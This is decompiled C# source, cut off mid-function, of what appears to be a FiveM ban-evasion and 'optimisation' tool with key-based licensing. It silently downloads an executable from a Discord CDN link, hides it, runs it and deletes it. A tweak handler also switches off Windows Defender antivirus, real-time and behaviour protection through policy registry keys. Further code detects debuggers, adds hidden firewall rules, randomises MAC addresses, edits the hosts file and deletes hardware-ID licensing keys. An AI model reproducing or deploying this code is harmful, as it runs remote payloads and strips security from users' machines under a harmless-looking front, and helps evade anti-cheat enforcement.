using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lean.Addons;
using LeanDevelopment.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace Lean.Forms
{
	// Token: 0x02000009 RID: 9
	public partial class Main : Form
	{
		// Token: 0x06000038 RID: 56 RVA: 0x000031A0 File Offset: 0x000013A0
		public Main()
		{
			System.Timers.Timer timer = new System.Timers.Timer(50.0);
			timer.AutoReset = true;
			timer.Elapsed += Main.MyMethod;
			timer.Start();
			this.by();
			this.u.BringToFront();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000021C0 File Offset: 0x000003C0
		private void a(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000021C8 File Offset: 0x000003C8
		public static void MyMethod(object sender, ElapsedEventArgs e)
		{
			Main.au();
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003210 File Offset: 0x00001410
		public static void MyMethod2(object sender, ElapsedEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FiveM");
			if (processesByName.Length != 0)
			{
				Thread.Sleep(1000);
				new Process
				{
					StartInfo = 
					{
						FileName = "cmd.exe",
						CreateNoWindow = true,
						RedirectStandardInput = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						Verb = "runas",
						Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
					}
				}.Start();
				Application.Exit();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000032AC File Offset: 0x000014AC
		private void b(object sender, EventArgs e)
		{
			this.n.Text = Login.KeyAuthApp.user_data.username;
			this.bq.Hide();
			this.br.Hide();
			int num = Convert.ToInt32(Login.KeyAuthApp.app_data.numUsers);
			this.bo.Text = "Total Users: " + num.ToString();
			Main.au();
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length == 0)
			{
				string path = "C:\\Program Files\\Win64";
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Win64");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				this.bj.Show();
				this.bc.Hide();
				this.bl.Hide();
				this.bm.Hide();
				this.bv.Hide();
				this.be.Hide();
				if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer")
				{
					this.bj.Hide();
					this.bc.Show();
					this.bl.Show();
					this.bm.Show();
					this.bv.Show();
					this.be.Show();
				}
				else if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Premium User")
				{
					this.bj.Hide();
					this.bc.Show();
					this.bl.Show();
					this.bm.Show();
					this.bv.Show();
					this.be.Show();
				}
				this.u.BringToFront();
				Login.KeyAuthApp.check();
				this.m.Text = Login.KeyAuthApp.user_data.subscriptions[0].subscription;
				this.p.Text = "Version:  " + Login.KeyAuthApp.app_data.version;
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				WebRequest webRequest = WebRequest.Create("https://pastebin.com/raw/GSXJSWtr");
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				WebRequest webRequest2 = WebRequest.Create("https://pastebin.com/raw/P72g9Hxd");
				WebResponse response2 = webRequest2.GetResponse();
				Stream responseStream2 = response2.GetResponseStream();
				StreamReader streamReader2 = new StreamReader(responseStream2);
				streamReader2.ReadToEnd();
			}
			else
			{
				base.Hide();
				MessageBox.Show("Debug Attempt Detected", "Devils Woofer", MessageBoxButtons.OK);
				Application.Exit();
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003588 File Offset: 0x00001788
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000021CF File Offset: 0x000003CF
		private void c(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000035AC File Offset: 0x000017AC
		private void d(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.aw.Text = string.Format("{0}/{1}/{2} {3}:{4}:{5}", new object[]
			{
				now.Day,
				now.Month,
				now.Year,
				now.Hour,
				now.Minute,
				now.Second
			});
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000021CF File Offset: 0x000003CF
		private void e(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000021CF File Offset: 0x000003CF
		private void f(object sender, EventArgs e)
		{
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000021CF File Offset: 0x000003CF
		private void g(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000021CF File Offset: 0x000003CF
		private void h(object sender, EventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000021CF File Offset: 0x000003CF
		private void i(object sender, EventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000021CF File Offset: 0x000003CF
		private void j(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000021CF File Offset: 0x000003CF
		private void k(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000021CF File Offset: 0x000003CF
		private void l(object sender, EventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000021D1 File Offset: 0x000003D1
		private void m(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000021CF File Offset: 0x000003CF
		private void n(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000021CF File Offset: 0x000003CF
		private void o(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000021CF File Offset: 0x000003CF
		private void p(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000021CF File Offset: 0x000003CF
		private void q(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000021CF File Offset: 0x000003CF
		private void r(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000021CF File Offset: 0x000003CF
		private void s(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000021CF File Offset: 0x000003CF
		private void t(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000021CF File Offset: 0x000003CF
		private void u(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000021CF File Offset: 0x000003CF
		private void v(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003634 File Offset: 0x00001834
		private void w(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\cache.exe"))
			{
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe";
				string fileName = "C:\\Program Files\\Win64\\cache.exe";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
				Thread.Sleep(1000);
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000021CF File Offset: 0x000003CF
		private void x(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000021CF File Offset: 0x000003CF
		private void y(object sender, EventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000021CF File Offset: 0x000003CF
		private void z(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000036D8 File Offset: 0x000018D8
		public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
		{
			string str = "Ethernet";
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.Id == adapterId)
				{
					str = networkInterface.Name;
					IL_40:
					string str2;
					if (enable)
					{
						str2 = "enable";
					}
					else
					{
						str2 = "disable";
					}
					ProcessStartInfo startInfo = new ProcessStartInfo("netsh", "interface set interface \"" + str + "\" " + str2);
					Process process = new Process();
					process.StartInfo = startInfo;
					process.Start();
					process.StartInfo.CreateNoWindow = true;
					process.WaitForExit();
					return;
				}
			}
			goto IL_40;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00003778 File Offset: 0x00001978
		public static string RandomMac()
		{
			string text = "ABCDEF0123456789";
			string text2 = "26AE";
			string text3 = "";
			Random random = new Random();
			text3 += text[random.Next(text.Length)].ToString();
			text3 += text2[random.Next(text2.Length)].ToString();
			for (int i = 0; i < 5; i++)
			{
				text3 += "-";
				text3 += text[random.Next(text.Length)].ToString();
				text3 += text[random.Next(text.Length)].ToString();
			}
			return text3;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000021D1 File Offset: 0x000003D1
		private void aa(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003848 File Offset: 0x00001A48
		public static string RandomString(int length)
		{
			return new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select(new Func<string, char>(Main.<>c.<>9.a)).ToArray<char>());
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003890 File Offset: 0x00001A90
		private void ab(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			try
			{
				if (this.ao.Text == "FiveM")
				{
					try
					{
						if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
						{
							File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
							File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
						}
						if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
						{
							Directory.Delete("C:\\Program Files (x86)\\Blade Group");
							Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
						}
						d d = new d();
						d.b();
					}
					catch
					{
					}
					string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("echo off");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
